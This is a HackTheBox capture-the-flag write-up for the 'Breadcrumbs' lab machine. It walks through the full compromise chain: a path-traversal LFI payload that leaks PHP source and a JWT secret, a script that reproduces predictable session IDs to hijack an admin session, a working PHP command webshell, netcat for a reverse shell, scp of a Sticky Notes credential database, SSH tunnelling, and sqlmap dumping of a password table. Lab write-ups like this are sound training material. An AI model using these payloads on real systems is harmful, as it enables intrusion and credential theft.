---
title: Write-up Breadcrumbs Machine
author: ScarNGone & pcw3r
date: 2021-07-17 16:00:00 +0100
categories: [HackTheBox, Boot2Root]
tags: [WINDOWS, HARD, FUZZING, COOKIE HIJACKING, JWT, LFI, Sticky Notes, SSH TUNNELING, SQL INJECTION]
---

**<center>Ref°: HTB-19-Boot2Root</center>**

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Badge-Breadcrumb.png" | relative_url }})

— Breadcrumbs is a vulnerable machine through :

* Foothold : Stealing ID Session cookie from LFI in php file
* Lateral movement : Reusing credentials plaintext in json file and database Sticky Notes
* Privesc : Check Kypter_Linux and SQL Injection in Password Manager

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Information-Breadcrumb.png" | relative_url }})


## **<span style='color:#c0392b'>[1] Discovery - Figure out environment</span>**
### Network Service Scanning
***

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-nmap.png" | relative_url }})

### Website on port 80 / 443
***

```
http://10.10.10.228/
```

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-website.png" | relative_url }})
![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-website-2.png" | relative_url }})


### Website Directory scanning
***

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-dirb-1.png" | relative_url }})
![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-dirb-2.png" | relative_url }})

### Website Fuzzing
***

```terminal
$ wfuzz -w /usr/share/wordlists/dirb/big.txt --hc 404,403 http://10.10.10.228/portal/FUZZ.php
```
![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-wfuzz.png" | relative_url }})

### Public file and directory
***

Publicly available upload file:

```
https://10.10.10.228/portal/uploads/
```

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-uploads.png" | relative_url }})

We get list of all users from admins.php. Only 3 users are active: `John`, `Olivia` and `Paul`

```
http://10.10.10.228/portal/php/admins.php
```

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-admins.png" | relative_url }})



### Login page and portal access
***

```
http://10.10.10.228/portal/login.php
```

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-login.png" | relative_url }})

```
http://10.10.10.228/portal/
```

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-interface.png" | relative_url }})

We get here privilege of each users. So if we combine with previous information about users, we can target next user : `Paul` (because he is an admin and his session is still active).

```
http://10.10.10.228/portal/php/users.php
```

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-users.png" | relative_url }})


The page issues.php reveal a hint about PHPSESSID .... let's start to find way around this.

```
http://10.10.10.228/portal/php/issues.php
```
![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-hint.png" | relative_url }})




## **<span style='color:#c0392b'>[2] Weaponization - Find exploit way</span>**
### LFI from php files
***

When we search book or anything from `bookController.php` we have possibility to generate an error with `&method=1` in request and this allow the reveal of array key `Book` and action `file_get_contents(../books/)`.

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-lfi-book.png" | relative_url }})

We test LFI to get php.ini and it's work!

```
book=../../../../../../Users/www-data/Desktop/xampp/php/php.ini&method=1
```

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-lfi-test.png" | relative_url }})

We recover the secret_key from authController.php to generate TOKEN: `6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e`

Reference: <https://extendsclass.com/php.html>

```php
<?php 
require 'db\/db.php';
require \"cookie.php\";
require \"vendor\/autoload.php\";
use \Firebase\JWT\JWT;

$errors = array();
$username = \"\";
$userdata = array();
$valid = false;
$IP = $_SERVER['REMOTE_ADDR'];

\/\/if user clicks on login
if($_SERVER['REQUEST_METHOD'] === \"POST\"){
    if($_POST['method'] == 0){
        $username = $_POST['username'];
        $password = $_POST['password'];
        
        $query = \"SELECT username,position FROM users WHERE username=? LIMIT 1\";
        $stmt = $con->prepare($query);
        $stmt->bind_param('s', $username);
        $stmt->execute();
        $result = $stmt->get_result();
        while ($row = $result->fetch_array(MYSQLI_ASSOC)){
            array_push($userdata, $row);
        }
        $userCount = $result->num_rows;
        $stmt->close();

        if($userCount > 0){
            $password = sha1($password);
            $passwordQuery = \"SELECT * FROM users WHERE password=? AND username=? LIMIT 1\";
            $stmt = $con->prepare($passwordQuery);
            $stmt->bind_param('ss', $password, $username);
            $stmt->execute();
            $result = $stmt->get_result();

            if($result->num_rows > 0){
                $valid = true;
            }
            $stmt->close();
        }

        if($valid){
            session_id(makesession($username));
            session_start();

            $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
            $data = array();

            $payload = array(
                \"data\" => array(
                    \"username\" => $username
            ));

            $jwt = JWT::encode($payload, $secret_key, 'HS256');
            
            setcookie(\"token\", $jwt, time() + (86400 * 30), \"\/\");

            $_SESSION['username'] = $username;
            $_SESSION['loggedIn'] = true;
            if($userdata[0]['position'] == \"\"){
                $_SESSION['role'] = \"Awaiting approval\";
            } 
            else{
                $_SESSION['role'] = $userdata[0]['position'];
            }
            
            header(\"Location: \/portal\");
        }

        else{
            $_SESSION['loggedIn'] = false;
            $errors['valid'] = \"Username or Password incorrect\";
        }
    }

    elseif($_POST['method'] == 1){
        $username=$_POST['username'];
        $password=$_POST['password'];
        $passwordConf=$_POST['passwordConf'];
        
        if(empty($username)){
            $errors['username'] = \"Username Required\";
        }
        if(strlen($username) < 4){
            $errors['username'] = \"Username must be at least 4 characters long\";
        }
        if(empty($password)){
            $errors['password'] = \"Password Required\"; 
        }
        if($password !== $passwordConf){
            $errors['passwordConf'] = \"Passwords don't match!\"; 
        }

        $userQuery = \"SELECT * FROM users WHERE username=? LIMIT 1\";
        $stmt = $con->prepare($userQuery);
        $stmt ->bind_param('s',$username);
        $stmt->execute();
        $result = $stmt->get_result();
        $userCount = $result->num_rows;
        $stmt->close();

        if($userCount > 0){
            $errors['username'] = \"Username already exists\";
        }

        if(count($errors) === 0){
            $password = sha1($password);
            $sql = \"INSERT INTO users(username, password, age, position) VALUES (?,?, 0, '')\";
            $stmt = $con->prepare($sql);
            $stmt ->bind_param('ss', $username, $password);

            if ($stmt->execute()){
                $user_id = $con->insert_id;
                header('Location: login.php');
            }
            else{
                $_SESSION['loggedIn'] = false;
                $errors['db_error']=\"Database error: failed to register\";
            }
        }
    }
} ?>

```

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-lfi-authController.png" | relative_url }})

We recover the key from cookie.php to generate PHPSESSID: `s4lTy_stR1nG_`

```
<?php
\/**
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * *\/
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = \"s4lTy_stR1nG_\".$username[$seed].\"(!528.\/9890\";
    $session_cookie = $username.md5($key);

    return $session_cookie;
} 
?>

```

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-lfi-cookie.png" | relative_url }})


### Cookie Hijacking
***

To get into the target, we use Cookie Hijacking method on Paul session.

I test with my user to understand how PHPSESSID is generated and adapt the php script to show me all value of PHPSESSID:

Reference: <https://www.unphp.net/decode/61dd1e1d6f02265102ec45fb408016c0/>


```php
<?php

$username = "privuser45";
$max = strlen($username) - 1;
$rota =[];
do { 
  $seed = rand(0, $max);
  $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
  $session_cookie = $username.md5($key);
  
  if (!in_array($seed,$rota))
  {
    var_dump($session_cookie);
    $rota[] = $seed;
    } 
}
while
  (count($rota) <= $max);
```

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-cookie-phpsessid-test.png" | relative_url }})

We test now with user Paul and get 4 values of PHPSESSID. Only 1 is good reference of active session.

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-cookie-phpsessid.png" | relative_url }})

To finalize the action, we generate the JWT token from jwt.io site with the secret_key:

References: 
* <https://owasp.org/www-chapter-vancouver/assets/presentations/2020-01_Attacking_and_Securing_JWT.pdf>
* <https://jwt.io/>
* <https://www.codementor.io/@byjg/using-json-web-token-jwt-as-a-php-session-axeuqbg1m>

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-cookie-token.png" | relative_url }})

We need to test now all PHPSESSID with token and the good one is: `paul47200b180ccd6835d25d034eeb6e6390`

So we have the following ID Session of Admin Paul: `PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU`

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-cookie-test.png" | relative_url }})

## **<span style='color:#c0392b'>[3] Foothold - Get into the target </span>**
### Uploading webshell and tool
***

We have now privilege to upload on website, with only zip restriction. I test to upload webshell with .html extension and change it to .php into burp.

```terminal
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-upload-webshell.png" | relative_url }})

And it's work, we have possibility now from uploads path to test if webshell works.

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-webshell.png" | relative_url }})

I decide to upload nc.zip and extract with powershell command.

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-nc.png" | relative_url }})

### Get revshell
***

Execute command to get a reverse shell.

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-revshell.png" | relative_url }})

## **<span style='color:#c0392b'>[4] Lateral Movement - Move through environment</span>**
### Enumeration and find plaintext Password of Juliette
***

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-jsonfile.png" | relative_url }})

### Recover Sqlite db of Sticky Notes App and find plaintext Password of Developpement
***

We get interesting note from Juliette workspace: `Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager` and `It stores passwords in plain text`.

Reference: <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#sticky-notes-passwords>

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-notes.png" | relative_url }})

We download db of the stiky note and retrieve plaintext passowrd of Juliette and Developpement.

```terminal
$ scp juliette@10.10.10.228:/C:/Users/juliette/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/* .
```

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-stickynotes-db.png" | relative_url }})

### Check Krypter_Linux
***
![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-prog.png" | relative_url }})

Krypter_Linux is `ELF 64-bit LSB pie executable`, so i decide to reverse with gbd but no success ...

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-reverse-prog.png" | relative_url }})

Check with strings command reveal interesting information about future release and features. And link reference of Password Manager `http://passmanager.htb:1234/index.php`

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-check-prog.png" | relative_url }})

Local box listen on this port, so we need to use ssh tunneling / local port forwarding to see and request with `method=select&username=administrator&table=passwords`

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-check-1234.png" | relative_url }})

## **<span style='color:#c0392b'>[5] Privilege Escalation - Gain higher-level permissions</span>**
### SSH Local Forwarding
***

```terminal
$ ssh -l juliette 10.10.10.228 -L 1234:127.0.0.1:1234
```

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-tunneling-test.png" | relative_url }})

cURL command with method reveal AES_Key.

```terminal
$ curl 'http://passmanager.htb:1234/index.php?method=select&username=administrator&table=passwords'
```
![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-injectionsql-1.png" | relative_url }})


### SQL Injection in Password Manager
***

Show all columns of table passwords in database bread:

```terminal
$ sqlmap 'http://passmanager.htb:1234/index.php?method=select&username=administrator&table=passwords' --columns
```

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-injectionsql-2.png" | relative_url }})

Dump values of columns accounts, aes_key, id and password for administrator:

```terminal
$ sqlmap 'http://passmanager.htb:1234/index.php?method=select&username=administrator&table=passwords' -C account,aes_key,id,password --dump
```

![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-injectionsql-3.png" | relative_url }})


![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-decrypt.png" | relative_url }})


![Desktop View]({{ "/assets/img/breadcrumb/HTB-Images-Breadcrumb-flag-root.png" | relative_url }})

***

# **<center>Trophy</center>**

> **--**
>
> --



